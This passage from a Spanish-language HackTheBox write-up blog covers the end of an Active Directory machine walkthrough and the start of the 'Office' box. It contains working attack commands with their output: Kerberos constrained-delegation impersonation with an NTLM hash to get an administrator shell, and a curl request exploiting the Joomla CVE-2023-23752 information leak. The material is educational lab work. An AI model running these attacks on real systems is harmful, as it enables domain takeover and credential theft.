                        the <span class="nt">-hashes</span> and <span class="nt">-aesKey</span> values
                        <span class="k">for </span>the specified <span class="nt">-identity</span>
                        should be provided. This allows
                        impresonation of protected <span class="nb">users
                        </span>and bypass of <span class="s2">"Kerberos-only"</span>
                        constrained delegation
                        restrictions. See CVE-2020-17049

authentication:
  <span class="nt">-hashes</span> LMHASH:NTHASH
                        NTLM hashes, format is
                        LMHASH:NTHASH
  <span class="nt">-no-pass</span>              don<span class="s1">'t ask for password (useful
                        for -k)
  -k                    Use Kerberos authentication.
                        Grabs credentials from ccache
                        file (KRB5CCNAME) based on
                        target parameters. If valid
                        credentials cannot be found, it
                        will use the ones specified in
                        the command line
  -aesKey hex key       AES key to use for Kerberos
                        Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain
                        controller. If omitted it use
                        the domain part (FQDN) specified
                        in the target parameter
</span></code></pre></div></div>

<ul>
  <li>Pero necesitamos el <code class="language-plaintext highlighter-rouge">SPN</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ pywerview get-netcomputer <span class="nt">-u</span> <span class="s1">'Ted.Graves'</span> <span class="nt">-t</span> 10.10.10.248 <span class="nt">--full-data</span>
Password:
objectclass:                    top, person, organizationalPerson, user, computer, msDS-GroupManagedServiceAccount
cn:                             svc_int
distinguishedname:              <span class="nv">CN</span><span class="o">=</span>svc_int,CN<span class="o">=</span>Managed Service Accounts,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
instancetype:                   4
whencreated:                    2021-04-19 00:49:58+00:00
whenchanged:                    2024-08-12 04:08:48+00:00
usncreated:                     12846
usnchanged:                     102619
name:                           svc_int
objectguid:                     <span class="o">{</span>f180a079-f326-49b2-84a1-34824208d642<span class="o">}</span>
useraccountcontrol:             WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
badpwdcount:                    0
codepage:                       0
countrycode:                    0
badpasswordtime:                2024-08-12 04:08:16.285681+00:00
lastlogoff:                     1601-01-01 00:00:00+00:00
lastlogon:                      2024-08-12 04:08:48.848196+00:00
localpolicyflags:               0
pwdlastset:                     2024-08-12 03:56:15.020052+00:00
primarygroupid:                 515
objectsid:                      S-1-5-21-4210132550-3389855604-3437519686-1144
accountexpires:                 9999-12-31 23:59:59.999999+00:00
logoncount:                     1
samaccountname:                 svc_int<span class="err">$</span>
samaccounttype:                 805306369
dnshostname:                    svc_int.intelligence.htb
objectcategory:                 <span class="nv">CN</span><span class="o">=</span>ms-DS-Group-Managed-Service-Account,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
iscriticalsystemobject:         False
dscorepropagationdata:          1601-01-01 00:00:00+00:00
lastlogontimestamp:             2024-08-12 04:08:48.848196+00:00
msds-allowedtodelegateto:       WWW/dc.intelligence.htb
msds-supportedencryptiontypes:  28
msds-managedpasswordid:         010000004b44534b020000006a010000130000000800000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
msds-managedpasswordpreviousid: 010000004b44534b020000006a010000110000000000000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
msds-managedpasswordinterval:   30
msds-groupmsamembership:        010004801400000000000000000000002400000001020000000000052000000020020000040050000200000000002400ff01... 

objectclass:                   top, person, organizationalPerson, user, computer
cn:                            DC
usercertificate:               308205fb308204e3a00302010202137100000002cc9c8450ce507e1c000000000002300d06092a864886f70d01010b050...
distinguishedname:             <span class="nv">CN</span><span class="o">=</span>DC,OU<span class="o">=</span>Domain Controllers,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
instancetype:                  4
whencreated:                   2021-04-19 00:42:41+00:00
whenchanged:                   2024-08-11 23:33:15+00:00
displayname:                   DC<span class="err">$</span>
usncreated:                    12293
memberof:                      <span class="nv">CN</span><span class="o">=</span>Pre-Windows 2000 Compatible Access,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb, 
                               <span class="nv">CN</span><span class="o">=</span>Cert Publishers,CN<span class="o">=</span>Users,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
usnchanged:                    102437
name:                          DC
objectguid:                    <span class="o">{</span>f28de281-fd79-40c5-a77b-1252b80550ed<span class="o">}</span>
useraccountcontrol:            SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
badpwdcount:                   0
codepage:                      0
countrycode:                   0
badpasswordtime:               1601-01-01 00:00:00+00:00
lastlogoff:                    1601-01-01 00:00:00+00:00
lastlogon:                     2024-08-12 00:32:44.441931+00:00
localpolicyflags:              0
pwdlastset:                    2024-08-11 23:32:46.261578+00:00
primarygroupid:                516
objectsid:                     S-1-5-21-4210132550-3389855604-3437519686-1000
accountexpires:                9999-12-31 23:59:59.999999+00:00
logoncount:                    323
samaccountname:                DC<span class="err">$</span>
samaccounttype:                805306369
operatingsystem:               Windows Server 2019 Datacenter
operatingsystemversion:        10.0 <span class="o">(</span>17763<span class="o">)</span>
serverreferencebl:             <span class="nv">CN</span><span class="o">=</span>DC,CN<span class="o">=</span>Servers,CN<span class="o">=</span>Default-First-Site-Name,CN<span class="o">=</span>Sites,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
dnshostname:                   dc.intelligence.htb
ridsetreferences:              <span class="nv">CN</span><span class="o">=</span>RID Set,CN<span class="o">=</span>DC,OU<span class="o">=</span>Domain Controllers,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
serviceprincipalname:          ldap/DC/intelligence, HOST/DC/intelligence, RestrictedKrbHost/DC, HOST/DC, ldap/DC, 
                               Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.intelligence.htb, 
                               ldap/dc.intelligence.htb/ForestDnsZones.intelligence.htb, 
                               ldap/dc.intelligence.htb/DomainDnsZones.intelligence.htb, DNS/dc.intelligence.htb, 
                               GC/dc.intelligence.htb/intelligence.htb, RestrictedKrbHost/dc.intelligence.htb, 
                               RPC/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb, 
                               HOST/dc.intelligence.htb/intelligence, HOST/dc.intelligence.htb, 
                               HOST/dc.intelligence.htb/intelligence.htb, 
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/195d59db-c263-4e51-b00b-4d6ce30136ea/intelligence.htb, 
                               ldap/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb, 
                               ldap/dc.intelligence.htb/intelligence, ldap/dc.intelligence.htb, 
                               ldap/dc.intelligence.htb/intelligence.htb
objectcategory:                <span class="nv">CN</span><span class="o">=</span>Computer,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
iscriticalsystemobject:        True
dscorepropagationdata:         2021-04-19 00:42:42+00:00, 1601-01-01 00:00:01+00:00
lastlogontimestamp:            2024-08-11 23:33:15.886587+00:00
msds-supportedencryptiontypes: 28
msds-generationid:             1b056d02cbe351ba...
msdfsr-computerreferencebl:    <span class="nv">CN</span><span class="o">=</span>DC,CN<span class="o">=</span>Topology,CN<span class="o">=</span>Domain System Volume,CN<span class="o">=</span>DFSR-GlobalSettings,CN<span class="o">=</span>System,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb 
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora lo impersonamos al administrador.</p>
  </li>
  <li>
    <p>Bueno esto significa que nos tenemos que sincronizar al reloj del DC.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-getST <span class="nt">-spn</span> WWW/dc.intelligence.htb <span class="nt">-impersonate</span> Administrator intelligence.htb/svc_int <span class="nt">-hashes</span> :4c395675187a74271de7c4af867ad417
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora nos sincronizamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>ntpdate <span class="nt">-s</span> 10.10.10.248
</code></pre></div></div>

<ul>
  <li>Y listo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-getST <span class="nt">-spn</span> WWW/dc.intelligence.htb <span class="nt">-impersonate</span> Administrator intelligence.htb/svc_int <span class="nt">-hashes</span> :4c395675187a74271de7c4af867ad417
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting S4U2self
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting S4U2Proxy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
</code></pre></div></div>

<ul>
  <li>Ahora nos autenticamos con el <code class="language-plaintext highlighter-rouge">ccache</code> y exportamos la variable de entorno.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
</code></pre></div></div>

<ul>
  <li>Ahora nos autenticamos y vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-wmiexec dc.intelligence.htb <span class="nt">-k</span> <span class="nt">-no-pass</span>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> SMBv3.0 dialect used
<span class="o">[!]</span> Launching semi-interactive shell - Careful what you execute
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
C:<span class="se">\&gt;</span><span class="nb">whoami
</span>intelligence<span class="se">\a</span>dministrator

C:<span class="se">\&gt;</span><span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
1b2c72e788bdcc6d73cb1b9175fb420c

C:<span class="se">\&gt;</span>
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Office (hard)</title><link href="http://localhost:4000/hackthebox/machines/hard/2024/07/19/office.html" rel="alternate" type="text/html" title="HackTheBox - Office (hard)" /><published>2024-07-19T00:00:00-06:00</published><updated>2024-07-19T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/hard/2024/07/19/office</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/hard/2024/07/19/office.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/2cdef06b99725f3dcce38431a95b7b77.png" />
</p>

<ul>
  <li>Office is a hard-difficulty Windows machine featuring various vulnerabilities including Joomla web application abuse, PCAP analysis to identify Kerberos credentials, abusing LibreOffice macros after disabling the <code class="language-plaintext highlighter-rouge">MacroSecurityLevel</code> registry value, abusing MSKRP to dump DPAPI credentials and abusing Group Policies due to excessive Active Directory privileges.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Puertos abiertos y servicios que están abiertos por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389,49664,49669,58531,58538,58562 10.10.11.3 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-07-18 17:50 CST
Nmap scan report <span class="k">for </span>10.10.11.3
Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.56 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28<span class="o">)</span>
|_http-title: Home
| http-robots.txt: 16 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
| /joomla/administrator/ /administrator/ /api/ /bin/
| /cache/ /cli/ /components/ /includes/ /installation/
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-server-header: Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28
|_http-generator: Joomla! - Open Source Content Management
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-07-19 07:49:54Z<span class="o">)</span>
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-07-19T07:51:27+00:00<span class="p">;</span> +7h59m33s from scanner time.
443/tcp   open  ssl/http      Apache httpd 2.4.56 <span class="o">(</span>OpenSSL/1.1.1t PHP/8.0.28<span class="o">)</span>
|_http-server-header: Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: 403 Forbidden
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-07-19T07:51:28+00:00<span class="p">;</span> +7h59m33s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-07-19T07:51:27+00:00<span class="p">;</span> +7h59m33s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-07-19T07:51:28+00:00<span class="p">;</span> +7h59m33s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
58531/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58538/tcp open  msrpc         Microsoft Windows RPC
58562/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: DC, www.example.com<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m32s, deviation: 0s, median: 7h59m32s
| smb2-time:
|   <span class="nb">date</span>: 2024-07-19T07:50:47
|_  start_date: N/A
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Estamos ante un Domain Controller.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.3
SMB         10.10.11.3      445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:office.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar los dominios al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.11.3 office.htb dc.office.htb DC.office.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.3 office.htb dc.office.htb DC.office.htb
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a comenzar enumerando recursos compartidos por el protocolo <strong>SMB</strong>.</p>
  </li>
  <li>
    <p>Si probamos con varias herramientas vemos que no podemos ya que no contamos con credenciales.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.3 <span class="nt">-u</span> <span class="s2">"miguelito"</span> <span class="nt">-p</span> <span class="s2">""</span> <span class="nt">--shares</span>
SMB         10.10.11.3      445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:office.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.3      445    DC               <span class="o">[</span>-] office.htb<span class="se">\m</span>iguelito: STATUS_LOGON_FAILURE
❯ smbmap <span class="nt">-H</span> 10.10.11.3 <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 0 SMB session<span class="o">(</span>s<span class="o">)</span>
❯ smbclient <span class="nt">-N</span> <span class="nt">-L</span> //10.10.11.3
session setup failed: NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>Tampoco podemos enumerar por el protocolo <strong>RPC</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.10.11.3
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<h2 id="shell-as-web_account">Shell as web_account</h2>

<ul>
  <li><strong>Nmap</strong> nos reporto que se esta empleando un Joomla como CMS en el puerto <strong>80</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>80/tcp    open  http          Apache httpd 2.4.56 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28<span class="o">)</span>
|_http-title: Home
| http-robots.txt: 16 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
| /joomla/administrator/ /administrator/ /api/ /bin/
| /cache/ /cli/ /components/ /includes/ /installation/
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-server-header: Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28
|_http-generator: Joomla! - Open Source Content Management
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/office/1.png" />
</p>

<ul>
  <li>Si examinamos las tecnologías que se están usando no nos reporta la versión del Joomla.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.11.3
http://10.10.11.3 <span class="o">[</span>200 OK] Apache[2.4.56], Cookies[3815f63d17a9109b26eb1b8c114159ac], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28], HttpOnly[3815f63d17a9109b26eb1b8c114159ac], IP[10.10.11.3], MetaGenerator[Joomla! - Open Source Content Management], OpenSSL[1.1.1t], PHP[8.0.28], PasswordField[password], PoweredBy[the], Script[application/json,application/ld+json,module], Title[Home], UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.0.28]
</code></pre></div></div>

<ul>
  <li>
    <p>Existe una herramienta la cual nos permite enumerar el Joomla de manera mas rápida <a href="https://www.kali.org/tools/joomscan/">https://www.kali.org/tools/joomscan/</a>.</p>
  </li>
  <li>
    <p>Ahora ya tenemos la versión.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ joomscan <span class="nt">-u</span> http://10.10.11.3

    ____  _____  _____  __  __  ___   ___    __    _  _
   <span class="o">(</span>_  _<span class="o">)(</span>  _  <span class="o">)(</span>  _  <span class="o">)(</span>  <span class="se">\/</span>  <span class="o">)</span>/ __<span class="o">)</span> / __<span class="o">)</span>  /__<span class="se">\ </span> <span class="o">(</span> <span class="se">\(</span> <span class="o">)</span>
  .-_<span class="o">)(</span>   <span class="o">)(</span>_<span class="o">)(</span>  <span class="o">)(</span>_<span class="o">)(</span>  <span class="o">)</span>    <span class="o">(</span> <span class="se">\_</span>_ <span class="se">\(</span> <span class="o">(</span>__  /<span class="o">(</span>__<span class="o">)</span><span class="se">\ </span> <span class="o">)</span>  <span class="o">(</span>
  <span class="se">\_</span>___<span class="o">)</span> <span class="o">(</span>_____<span class="o">)(</span>_____<span class="o">)(</span>_/<span class="se">\/\_</span><span class="o">)(</span>___/ <span class="se">\_</span>__<span class="o">)(</span>__<span class="o">)(</span>__<span class="o">)(</span>_<span class="o">)</span><span class="se">\_</span><span class="o">)</span>
			<span class="o">(</span>1337.today<span class="o">)</span>

    <span class="nt">--</span><span class="o">=[</span>OWASP JoomScan
    +---++---<span class="o">==[</span>Version : 0.0.7
    +---++---<span class="o">==[</span>Update Date : <span class="o">[</span>2018/09/23]
    +---++---<span class="o">==[</span>Authors : Mohammad Reza Espargham , Ali Razmjoo
    <span class="nt">--</span><span class="o">=[</span>Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.11.3 ...



<span class="o">[</span>+] FireWall Detector
<span class="o">[</span>++] Firewall not detected

<span class="o">[</span>+] Detecting Joomla Version
<span class="o">[</span>++] Joomla 4.2.7

<span class="o">[</span>+] Core Joomla Vulnerability
<span class="o">[</span>++] Target Joomla core is not vulnerable

<span class="o">[</span>+] Checking Directory Listing
<span class="o">[</span>++] directory has directory listing :
http://10.10.11.3/administrator/components
http://10.10.11.3/administrator/modules
http://10.10.11.3/administrator/templates
http://10.10.11.3/images/banners


<span class="o">[</span>+] Checking apache info/status files
<span class="o">[</span>++] Readable info/status files are not found

<span class="o">[</span>+] admin finder
<span class="o">[</span>++] Admin page : http://10.10.11.3/administrator/

<span class="o">[</span>+] Checking robots.txt existing
<span class="o">[</span>++] robots.txt is found
path : http://10.10.11.3/robots.txt

Interesting path found from robots.txt
http://10.10.11.3/joomla/administrator/
http://10.10.11.3/administrator/
http://10.10.11.3/api/
http://10.10.11.3/bin/
http://10.10.11.3/cache/
http://10.10.11.3/cli/
http://10.10.11.3/components/
http://10.10.11.3/includes/
http://10.10.11.3/installation/
http://10.10.11.3/language/
http://10.10.11.3/layouts/
http://10.10.11.3/libraries/
http://10.10.11.3/logs/
http://10.10.11.3/modules/
http://10.10.11.3/plugins/
http://10.10.11.3/tmp/


<span class="o">[</span>+] Finding common backup files name
<span class="o">[</span>++] Backup files are not found

<span class="o">[</span>+] Finding common log files name
<span class="o">[</span>++] error log is not found

<span class="o">[</span>+] Checking sensitive config.php.x file
<span class="o">[</span>++] Readable config files are not found


Your Report : reports/10.10.11.3/
</code></pre></div></div>

<ul>
  <li>
    <p>El CMS Joomla es Open Source y puedes ver los archivos de configuración en su GitHub <a href="https://github.com/joomla/joomla-cms">https://github.com/joomla/joomla-cms</a>.</p>
  </li>
  <li>
    <p>Si buscamos por vulnerabilidades encontramos el CVE-2023-23752 <a href="https://github.com/Acceis/exploit-CVE-2023-23752">https://github.com/Acceis/exploit-CVE-2023-23752</a> es un Unauthorized Access to webservice endpoints que nos permite ver información importante, aquí nos comparten la ruta donde se aplica <a href="https://www.exploit-db.com/exploits/51334">https://www.exploit-db.com/exploits/51334</a>.</p>
  </li>
  <li>
    <p>Vemos una contraseña.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="s1">'http://office.htb/api/index.php/v1/config/application?public=true'</span> | jq <span class="nb">.</span>
<span class="o">{</span>
  <span class="s2">"links"</span>: <span class="o">{</span>
    <span class="s2">"self"</span>: <span class="s2">"http://office.htb/api/index.php/v1/config/application?public=true"</span>,
    <span class="s2">"next"</span>: <span class="s2">"http://office.htb/api/index.php/v1/config/application?public=true&amp;page%5Boffset%5D=20&amp;page%5Blimit%5D=20"</span>,
    <span class="s2">"last"</span>: <span class="s2">"http://office.htb/api/index.php/v1/config/application?public=true&amp;page%5Boffset%5D=60&amp;page%5Blimit%5D=20"</span>
  <span class="o">}</span>,
  <span class="s2">"data"</span>: <span class="o">[</span>
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"offline"</span>: <span class="nb">false</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"offline_message"</span>: <span class="s2">"This site is down for maintenance.&lt;br&gt;Please check back again soon."</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"display_offline_message"</span>: 1,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"offline_image"</span>: <span class="s2">""</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"sitename"</span>: <span class="s2">"Holography Industries"</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"editor"</span>: <span class="s2">"tinymce"</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"captcha"</span>: <span class="s2">"0"</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"list_limit"</span>: 20,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"access"</span>: 1,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
